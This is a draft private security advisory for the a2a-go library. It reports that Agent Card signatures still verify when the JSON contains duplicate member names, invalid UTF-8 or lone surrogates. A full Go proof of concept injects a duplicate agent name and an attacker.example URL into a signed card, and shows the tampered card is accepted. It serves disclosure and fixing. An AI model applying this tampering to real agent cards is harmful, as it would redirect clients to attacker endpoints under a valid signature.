# Security advisory draft: a2a-go, card signatures verify over JSON that is not I-JSON (A3)

> **NOT SUBMITTED - on hold per product owner (more testing first).**
> Private report only. Never file this as a public issue, and do not mention it publicly until the
> maintainers publish an advisory or a fixed release (a2a-go SECURITY.md).
>
> **License: Apache-2.0** (ANet LICENSE, condition 3).

Background and the full analysis: ../issue-a2a-go.md A3. Standalone reproduction:
repro/a2a-go/a3-duplicate-members/ (its source is embedded below, so the report stands on its own).
Re-run it before submitting; if it prints "reproduced: no", do not submit.

Relation to public discussion (checked 2026-09-29): a2a-go #445 and A2A #2122 discuss which bytes
section 8.4.1 canonicalizes (rule 1, default values); a2a-tck #228/#245 carry byte vectors. None
mentions duplicate member names, invalid UTF-8 or lone surrogates. If a fix for #445 rewrites
canonicalizeJSON as a proto projection, duplicates would be resolved by that decoder, so this report
should reach the maintainers before that change is designed.

## Where and how

Submit through GitHub Security Advisories, as a2a-go SECURITY.md directs (checked 2026-09-29, still
ebf17c5): the "Report a vulnerability" form at
https://github.com/a2aproject/a2a-go/security/advisories/new . Submit A9 (advisory-a2a-go-A9.md)
first; this one the same week. The submitting account is the one the product owner designates
(docs/notes/0032 D1); the report does not mention anet (D5).

## Form fields

| Field | Value |
|---|---|
| Title | a2acrypto: Agent Card signatures verify over JSON with duplicate member names, invalid UTF-8 or lone surrogates |
| Ecosystem | Go |
| Package | github.com/a2aproject/a2a-go/v2 (package a2acrypto; reached through a2aclient/agentcard.Resolver) |
| Affected versions | >= 2.6.0 (first release with a2acrypto) |
| Patched versions | none (2026-09-29) |
| Severity (suggested; maintainers to assess) | Moderate; needs an attacker on the card's path and a consumer that reads the verified bytes with another JSON reader |
| Weaknesses | CWE-347 Improper Verification of Cryptographic Signature; CWE-436 Interpretation Conflict |
| Credits | the submitting account |

## Description (paste into the form)

The three number/tilde-fenced blocks below use four backticks so the inner Go fences survive a copy.

````````markdown
### Summary

`canonicalizeJSON` (`a2acrypto/canonical.go`) decodes the card with `encoding/json` into
`map[string]any`. For a repeated member name the last value wins; invalid UTF-8 and lone-surrogate
escapes become U+FFFD. RFC 8785, which A2A section 8.4.1 requires, is defined over I-JSON (RFC 8785
section 3.1 -> RFC 7493), which forbids both. A party without the signing key can therefore

1. insert a second `name`, `url`, security scheme, ... before the signed one: the signature still
   verifies, a2a-go reads the signed value, and a reader that keeps the first occurrence reads the
   inserted one; and
2. replace invalid bytes or a lone-surrogate escape inside a signed string with different invalid
   bytes: both decode to U+FFFD, so one signature covers byte strings the agent never produced.

### PoC

Standalone program, a2a-go v2.6.0 from proxy.golang.org, standard library otherwise
(`go mod init poc && go get github.com/a2aproject/a2a-go/v2@v2.6.0 && go run .`):

```go
// A3 (security advisory draft): a2acrypto verifies a card signature over
// JSON that is not I-JSON (RFC 7493), which RFC 8785 and therefore A2A
// §8.4.1 require. A party without the signing key can
//   - put a second "name" (or "url", ...) member in front of the signed one:
//     a2acrypto and a2a.AgentCard keep the last value, a first-wins reader
//     sees the inserted one;
//   - swap invalid UTF-8 bytes or lone-surrogate escapes in a signed string
//     for other invalid bytes: both decode to U+FFFD, the signature still
//     verifies over bytes the agent never produced.
//
// The first case is shown end to end through agentcard.Resolver with a
// Verifier, as a client would use it.
//
// Run: go run ./a3-duplicate-members
// Exit status: 0 = behaviour reproduced, 1 = not reproduced, 2 = setup error.
package main

import (
	"bytes"
	"context"
	"crypto"
	"crypto/ed25519"
	"crypto/rand"
	"encoding/json"
	"fmt"
	"net/http"
	"net/http/httptest"
	"os"
	"strings"

	"github.com/a2aproject/a2a-go/v2/a2aclient/agentcard"
	"github.com/a2aproject/a2a-go/v2/a2acrypto"
)

const signedCard = `{"name":"Payments Agent","description":"d","version":"1",` +
	`"supportedInterfaces":[{"url":"https://payments.example/a2a","protocolBinding":"JSONRPC","protocolVersion":"1.0"}],` +
	`"capabilities":{},"defaultInputModes":["text/plain"],"defaultOutputModes":["text/plain"],` +
	`"skills":[{"id":"pay","name":"pay","description":"d","tags":["t"]}]}`

func main() {
	ctx := context.Background()
	pub, priv, err := ed25519.GenerateKey(rand.Reader)
	must(err)
	signer, err := a2acrypto.NewSigner(a2acrypto.SignerConfig{PrivateKey: priv, KeyID: "k"})
	must(err)
	verifier := a2acrypto.NewVerifier(a2acrypto.VerifierConfig{
		KeyResolver: a2acrypto.KeyResolverFunc(func(context.Context, string) (crypto.PublicKey, error) { return pub, nil }),
	})
	sig, err := signer.Sign(ctx, json.RawMessage(signedCard))
	must(err)
	sigs, err := json.Marshal([]any{sig})
	must(err)

	// 1. Duplicate member, inserted by whoever serves the card.
	tampered := strings.Replace(signedCard, `{"name":"Payments Agent"`, `{"name":"Evil Agent","name":"Payments Agent"`, 1)
	tampered = strings.Replace(tampered, `"supportedInterfaces":[{"url":"https://payments.example/a2a"`,
		`"supportedInterfaces":[{"url":"https://attacker.example/a2a","url":"https://payments.example/a2a"`, 1)
	served := strings.TrimSuffix(tampered, "}") + `,"signatures":` + string(sigs) + "}"

	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		fmt.Fprint(w, served)
	}))
	defer srv.Close()
	resolver := &agentcard.Resolver{Client: srv.Client(), Verifier: verifier}
	card, errResolve := resolver.Resolve(ctx, srv.URL)
	fmt.Printf("served card:                          %s...\n", served[:120])
	fmt.Printf("Resolver with Verifier:               %v\n", errOrOK(errResolve))
	if card != nil {
		fmt.Printf("  a2a-go reads name / url:            %q / %q\n", card.Name, card.SupportedInterfaces[0].URL)
	}
	firstName, firstURL := firstWins([]byte(served))
	fmt.Printf("  a first-wins reader, same bytes:    %q / %q\n", firstName, firstURL)

	// 2. Invalid UTF-8: sign one invalid byte, verify with another.
	signedBad := []byte("{\"name\":\"Agent \xff\",\"description\":\"d\"}")
	otherBad := []byte("{\"name\":\"Agent \xfe\",\"description\":\"d\"}")
	sigBad, err := signer.Sign(ctx, signedBad)
	must(err)
	errUTF8 := verifier.Verify(ctx, otherBad, sigBad)
	fmt.Printf("signed 0xFF, verified with 0xFE:      %v\n", errOrOK(errUTF8))

	// 3. Lone surrogate escapes: sign \ud800, verify with \udfff.
	signedSur := []byte(`{"name":"Agent \ud800","description":"d"}`)
	otherSur := []byte(`{"name":"Agent \udfff","description":"d"}`)
	sigSur, err := signer.Sign(ctx, signedSur)
	must(err)
	errSur := verifier.Verify(ctx, otherSur, sigSur)
	fmt.Printf("signed \\ud800, verified with \\udfff: %v\n", errOrOK(errSur))
	fmt.Println("expected (RFC 8785 §3.1 -> RFC 7493): all three rejected")

	if errResolve == nil || errUTF8 == nil || errSur == nil {
		fmt.Println("reproduced: yes")
		return
	}
	fmt.Println("reproduced: no")
	os.Exit(1)
}

// firstWins reads the card the way a first-match reader does (for example
// a streaming parser that stops at the first matching member): it returns
// the first top-level "name" and the first "url" of the first interface.
func firstWins(b []byte) (name, url string) {
	seen := map[string]string{}
	dec := json.NewDecoder(bytes.NewReader(b))
	var walk func(path string) error
	walk = func(path string) error {
		tok, err := dec.Token()
		if err != nil {
			return err
		}
		switch t := tok.(type) {
		case json.Delim:
			switch t {
			case '{':
				for dec.More() {
					k, err := dec.Token()
					if err != nil {
						return err
					}
					if err := walk(path + "/" + k.(string)); err != nil {
						return err
					}
				}
			case '[':
				for i := 0; dec.More(); i++ {
					if err := walk(fmt.Sprintf("%s/%d", path, i)); err != nil {
						return err
					}
				}
			}
			_, err := dec.Token() // closing delimiter
			return err
		case string:
			if _, ok := seen[path]; !ok {
				seen[path] = t
			}
		}
		return nil
	}
	_ = walk("")
	return seen["/name"], seen["/supportedInterfaces/0/url"]
}

func errOrOK(err error) string {
	if err == nil {
		return "accepted"
	}
	return err.Error()
}

func must(err error) {
	if err != nil {
		fmt.Println("setup error:", err)
		os.Exit(2)
	}
}

```

Output on v2.6.0 (2026-09-29):

```
served card:                          {"name":"Evil Agent","name":"Payments Agent",...
Resolver with Verifier:               accepted
  a2a-go reads name / url:            "Payments Agent" / "https://payments.example/a2a"
  a first-wins reader, same bytes:    "Evil Agent" / "https://attacker.example/a2a"
signed 0xFF, verified with 0xFE:      accepted
signed \ud800, verified with \udfff: accepted
reproduced: yes
```

### Impact

A consumer that verifies with a2a-go and then reads the card with a first-wins parser (or hands the
bytes to one) acts on content the agent never signed: another name, interface URL, or security
scheme. The U+FFFD collision lets an intermediary vary string bytes under one signature, which
defeats deduplication and byte-exact caching.

### Suggested fix

In `canonicalizeJSON`, for both signing and verification, reject: duplicate member names at any depth,
invalid UTF-8, lone-surrogate `\u` escapes, and numbers outside IEEE 754 binary64. A token-level pass
(`json.Decoder.Token` with a per-object key set) finds duplicates; UTF-8 must be checked on the raw
bytes. Consider also rejecting member names equal under case folding, since `encoding/json` matches
struct fields case-insensitively (a card with `protocolBinding` and `PROTOCOLBINDING` is read one way
by the map canonicalizer and another by `a2a.AgentCard`).
````````

## After submission

- Record the advisory id and date in docs/notes/0032 (not the advisory text).
- Follow up only inside the advisory. Proposed disclosure window: 90 days, or the maintainers' fixed
  release if earlier.
